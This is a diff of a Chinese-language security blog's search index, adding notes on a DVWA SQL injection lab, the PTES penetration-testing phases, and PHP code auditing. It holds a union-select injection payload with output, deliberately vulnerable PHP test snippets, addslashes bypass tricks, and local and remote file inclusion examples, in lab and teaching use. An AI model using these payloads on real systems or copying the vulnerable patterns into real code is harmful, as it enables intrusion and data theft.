@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>DVWA</title>
+    <url>/2020/04/02/DVWA/</url>
+    <content><![CDATA[<p><strong>SQL Injection</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>Metasploit魔鬼训练营</title>
+    <url>/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/</url>
+    <content><![CDATA[<h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
+<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
+<p>PTES渗透测试标准，具体包括7个阶段：</p>
+<p><strong>1.前期交互截断</strong></p>
+<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
+<p><strong>2.情报收集阶段</strong></p>
+<p><strong>3.威胁建模阶段</strong></p>
+<p><strong>4.漏洞分析阶段</strong></p>
+<p><strong>5.渗透攻击阶段</strong></p>
+<p><strong>6.后渗透攻击阶段</strong></p>
+<p><strong>7.报告阶段</strong></p>
+]]></content>
+  </entry>
+  <entry>
     <title>渗透实战学习</title>
     <url>/2020/03/27/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<hr>
@@ -49,12 +73,14 @@
 <p>PHP5.4.0以下的版本可以正常使用</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p>
+<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">
+
 <h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
 <p>测试代码如下：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt></p>
+<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">
+
 <h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
 <p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
 <p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
@@ -94,7 +120,7 @@
 <h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
 <p>error_reporting 是用来配值错误显示的级别。</p>
 <hr>
-<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h4 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h4><hr>
+<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><hr>
 <h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
 <p>攻击方式：</p>
 <p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
@@ -147,7 +173,8 @@
 <h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>
 
 <p>输入：<strong>?p=1%2527</strong></p>
-<p>输出：<strong>$a=1%27     $b=1’</strong></p>
+<p>输出：*<em>$a=1%27     *</em></p>
+<p>​           <strong>$b=1’</strong></p>
 <p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
 <p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
 <p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
@@ -170,11 +197,27 @@
 <p>还有一些开源类过滤union、select等关键字</p>
 <p><strong>1.addslashes</strong>函数</p>
 <p>以下方法可以绕过该函数</p>
-<p>$userid = urldecode($userid) //注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</p>
-<p>$userid = rawurldecode($userid)</p>
-<p>$userid = base64_decode($userid) //首先通过addslashes()过滤，然后urlencode解码</p>
-<p>$userid = json_encode($userid)  //该函数把\转换为\，两个反斜杠抵消。</p>
-<p>2.mysql_ (real_) escape_string 函数</p>
+<table>
+<thead>
+<tr>
+<th>$userid = urldecode($userid)</th>
+<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>$userid = rawurldecode($userid)</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>$userid = base64_decode($userid)</strong></td>
+<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
+</tr>
+<tr>
+<td><strong>$userid = json_encode($userid)</strong></td>
+<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
+</tr>
+</tbody></table>
+<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
 <p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>
 
@@ -204,7 +247,7 @@
 <p>测试代码：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>代码中echo “sig:”.$_GET[“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
+<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
 <p>所以可以直接利用GET方式注入代码</p>
 <h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>
@@ -227,10 +270,9 @@
 <p>如果没有token，直接请求这个页面，不带refer</p>
 <p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
 <p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
-<p>6.2 漏洞防范</p>
-<p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
+<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
 <p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
-<p>1.Token验证</p>
+<p><strong>1.Token验证</strong></p>
 <p>token翻译为”标志”，在计算机认证领域叫令牌</p>
 <p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
 <p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
@@ -239,18 +281,34 @@
 
 
 
+<hr>
+<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
+<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
+<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
+<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
+<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
+<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>输出结果：</p>
+<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">
 
+<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
+<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
+<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
+<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
+<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
+<p>下面是基于HTTP协议测试代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>
 
+<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
+<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">
 
-
-
-
-
-
-
+<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
 <hr>
 <h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
 <p>例如：</p>
